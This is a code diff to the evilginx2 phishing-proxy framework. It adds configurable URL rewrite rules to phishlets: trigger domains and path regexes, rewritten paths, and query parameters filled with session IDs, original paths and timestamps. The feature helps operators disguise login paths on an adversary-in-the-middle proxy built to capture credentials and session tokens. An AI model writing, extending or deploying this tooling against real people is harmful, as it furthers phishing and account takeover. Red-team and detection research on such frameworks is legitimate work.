@@ -2,9 +2,11 @@ package core
 
 import (
 	"fmt"
+	"net/url"
 	"regexp"
 	"strconv"
 	"strings"
+	"time"
 
 	"github.com/kgretzky/evilginx2/log"
 	"github.com/spf13/viper"
@@ -105,6 +107,26 @@ type Intercept struct {
 	mime        string         `mapstructure:"mime"`
 }
 
+type UrlRewriteQuery struct {
+	Key   string `mapstructure:"key"`
+	Value string `mapstructure:"value"`
+}
+
+type UrlRewrite struct {
+	Path        string            `mapstructure:"path"`
+	QueryParams []UrlRewriteQuery `mapstructure:"query_params"`
+}
+
+type UrlRewriteTrigger struct {
+	Domains []string `mapstructure:"domains"`
+	Paths   []string `mapstructure:"paths"`
+}
+
+type UrlRewriteRule struct {
+	Trigger UrlRewriteTrigger `mapstructure:"trigger"`
+	Rewrite UrlRewrite        `mapstructure:"rewrite"`
+}
+
 type Phishlet struct {
 	Name             string
 	ParentName       string
@@ -131,6 +153,8 @@ type Phishlet struct {
 	intercept        []Intercept
 	customParams     map[string]string
 	isTemplate       bool
+	urlRewrites      []UrlRewriteRule
+	urlRewriter      *UrlRewriter
 }
 
 type ConfigParam struct {
@@ -218,20 +242,41 @@ type ConfigIntercept struct {
 	Mime       *string `mapstructure:"mime"`
 }
 
+type ConfigUrlRewriteQuery struct {
+	Key   *string `mapstructure:"key"`
+	Value *string `mapstructure:"value"`
+}
+
+type ConfigUrlRewrite struct {
+	Path        *string                   `mapstructure:"path"`
+	QueryParams *[]ConfigUrlRewriteQuery  `mapstructure:"query_params"`
+}
+
+type ConfigUrlRewriteTrigger struct {
+	Domains *[]string `mapstructure:"domains"`
+	Paths   *[]string `mapstructure:"paths"`
+}
+
+type ConfigUrlRewriteRule struct {
+	Trigger *ConfigUrlRewriteTrigger `mapstructure:"trigger"`
+	Rewrite *ConfigUrlRewrite        `mapstructure:"rewrite"`
+}
+
 type ConfigPhishlet struct {
-	Name        string             `mapstructure:"name"`
-	RedirectUrl string             `mapstructure:"redirect_url"`
-	Params      *[]ConfigParam     `mapstructure:"params"`
-	ProxyHosts  *[]ConfigProxyHost `mapstructure:"proxy_hosts"`
-	SubFilters  *[]ConfigSubFilter `mapstructure:"sub_filters"`
-	AuthTokens  *[]ConfigAuthToken `mapstructure:"auth_tokens"`
-	AuthUrls    []string           `mapstructure:"auth_urls"`
-	Credentials *ConfigCredentials `mapstructure:"credentials"`
-	ForcePosts  *[]ConfigForcePost `mapstructure:"force_post"`
-	LandingPath *[]string          `mapstructure:"landing_path"`
-	LoginItem   *ConfigLogin       `mapstructure:"login"`
-	JsInject    *[]ConfigJsInject  `mapstructure:"js_inject"`
-	Intercept   *[]ConfigIntercept `mapstructure:"intercept"`
+	Name        string                  `mapstructure:"name"`
+	RedirectUrl string                  `mapstructure:"redirect_url"`
+	Params      *[]ConfigParam          `mapstructure:"params"`
+	ProxyHosts  *[]ConfigProxyHost      `mapstructure:"proxy_hosts"`
+	SubFilters  *[]ConfigSubFilter      `mapstructure:"sub_filters"`
+	AuthTokens  *[]ConfigAuthToken      `mapstructure:"auth_tokens"`
+	AuthUrls    []string                `mapstructure:"auth_urls"`
+	Credentials *ConfigCredentials      `mapstructure:"credentials"`
+	ForcePosts  *[]ConfigForcePost      `mapstructure:"force_post"`
+	LandingPath *[]string               `mapstructure:"landing_path"`
+	LoginItem   *ConfigLogin            `mapstructure:"login"`
+	JsInject    *[]ConfigJsInject       `mapstructure:"js_inject"`
+	Intercept   *[]ConfigIntercept      `mapstructure:"intercept"`
+	UrlRewrites *[]ConfigUrlRewriteRule `mapstructure:"url_rewrites"`
 }
 
 func NewPhishlet(site string, path string, customParams *map[string]string, cfg *Config) (*Phishlet, error) {
@@ -266,6 +311,8 @@ func (p *Phishlet) Clear() {
 	p.forcePost = []ForcePost{}
 	p.customParams = make(map[string]string)
 	p.isTemplate = false
+	p.urlRewrites = []UrlRewriteRule{}
+	p.urlRewriter = NewUrlRewriter()
 }
 
 func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[string]string) error {
@@ -758,6 +805,64 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			p.landing_path[n] = p.paramVal(p.landing_path[n])
 		}
 	}
+
+	// Parse URL rewrite rules
+	if fp.UrlRewrites != nil {
+		for _, ur := range *fp.UrlRewrites {
+			if ur.Trigger == nil {
+				return fmt.Errorf("url_rewrites: missing `trigger` section")
+			}
+			if ur.Rewrite == nil {
+				return fmt.Errorf("url_rewrites: missing `rewrite` section")
+			}
+			if ur.Trigger.Domains == nil || len(*ur.Trigger.Domains) == 0 {
+				return fmt.Errorf("url_rewrites: missing or empty `trigger.domains` field")
+			}
+			if ur.Trigger.Paths == nil || len(*ur.Trigger.Paths) == 0 {
+				return fmt.Errorf("url_rewrites: missing or empty `trigger.paths` field")
+			}
+			if ur.Rewrite.Path == nil || *ur.Rewrite.Path == "" {
+				return fmt.Errorf("url_rewrites: missing or empty `rewrite.path` field")
+			}
+
+			rule := UrlRewriteRule{}
+			
+			// Process trigger domains
+			for _, d := range *ur.Trigger.Domains {
+				rule.Trigger.Domains = append(rule.Trigger.Domains, strings.ToLower(p.paramVal(d)))
+			}
+			
+			// Process trigger paths
+			for _, path := range *ur.Trigger.Paths {
+				rule.Trigger.Paths = append(rule.Trigger.Paths, p.paramVal(path))
+			}
+			
+			// Process rewrite path
+			rule.Rewrite.Path = p.paramVal(*ur.Rewrite.Path)
+			
+			// Process query parameters
+			if ur.Rewrite.QueryParams != nil {
+				for _, qp := range *ur.Rewrite.QueryParams {
+					if qp.Key == nil || *qp.Key == "" {
+						return fmt.Errorf("url_rewrites: missing or empty query param `key` field")
+					}
+					if qp.Value == nil {
+						return fmt.Errorf("url_rewrites: missing query param `value` field")
+					}
+					
+					query := UrlRewriteQuery{
+						Key:   p.paramVal(*qp.Key),
+						Value: p.paramVal(*qp.Value),
+					}
+					rule.Rewrite.QueryParams = append(rule.Rewrite.QueryParams, query)
+				}
+			}
+			
+			p.urlRewrites = append(p.urlRewrites, rule)
+			p.urlRewriter.AddRule(&rule)
+		}
+	}
+
 	return nil
 }
 
@@ -1105,4 +1210,98 @@ func (p *Phishlet) paramVal(s string) string {
 		}
 	}
 	return ret
+}
+
+// UrlRewriter handles URL rewriting logic
+type UrlRewriter struct {
+	rules []*UrlRewriteRule
+}
+
+func NewUrlRewriter() *UrlRewriter {
+	return &UrlRewriter{
+		rules: make([]*UrlRewriteRule, 0),
+	}
+}
+
+// AddRule adds a URL rewriting rule
+func (u *UrlRewriter) AddRule(rule *UrlRewriteRule) {
+	u.rules = append(u.rules, rule)
+}
+
+// RewriteUrl checks if a URL should be rewritten and returns the new URL
+func (u *UrlRewriter) RewriteUrl(domain string, path string, sessionId string, originalPath string) (string, bool) {
+	for _, rule := range u.rules {
+		// Check if domain matches
+		domainMatch := false
+		for _, d := range rule.Trigger.Domains {
+			if d == domain {
+				domainMatch = true
+				break
+			}
+		}
+		
+		if !domainMatch {
+			continue
+		}
+		
+		// Check if path matches any regex pattern
+		pathMatch := false
+		for _, p := range rule.Trigger.Paths {
+			re, err := regexp.Compile(p)
+			if err != nil {
+				continue
+			}
+			if re.MatchString(path) {
+				pathMatch = true
+				break
+			}
+		}
+		
+		if !pathMatch {
+			continue
+		}
+		
+		// Build rewritten URL
+		newPath := rule.Rewrite.Path
+		
+		// Build query parameters
+		queryParams := make([]string, 0)
+		for _, qp := range rule.Rewrite.QueryParams {
+			key := qp.Key
+			value := qp.Value
+			
+			// Replace placeholders
+			value = strings.ReplaceAll(value, "{session_id}", sessionId)
+			value = strings.ReplaceAll(value, "{original_path}", originalPath)
+			value = strings.ReplaceAll(value, "{timestamp}", strconv.FormatInt(time.Now().Unix(), 10))
+			value = strings.ReplaceAll(value, "{id}", sessionId) // Legacy support
+			
+			queryParams = append(queryParams, key+"="+url.QueryEscape(value))
+		}
+		
+		// Construct final URL
+		if len(queryParams) > 0 {
+			newPath += "?" + strings.Join(queryParams, "&")
+		}
+		
+		return newPath, true
+	}
+	
+	return path, false
+}
+
+// GetOriginalPath extracts the original path from rewritten URL query parameters
+func (u *UrlRewriter) GetOriginalPath(queryParams map[string]string) (string, bool) {
+	if originalPath, ok := queryParams["redirect"]; ok {
+		return originalPath, true
+	}
+	if originalPath, ok := queryParams["redirect_path"]; ok {
+		return originalPath, true
+	}
+	return "", false
+}
+
+// RewriteUrlIfNeeded checks if URL should be rewritten for the phishlet
+func (p *Phishlet) RewriteUrlIfNeeded(domain string, path string, sessionId string) (string, bool) {
+	return p.urlRewriter.RewriteUrl(domain, path, sessionId, path)
 }
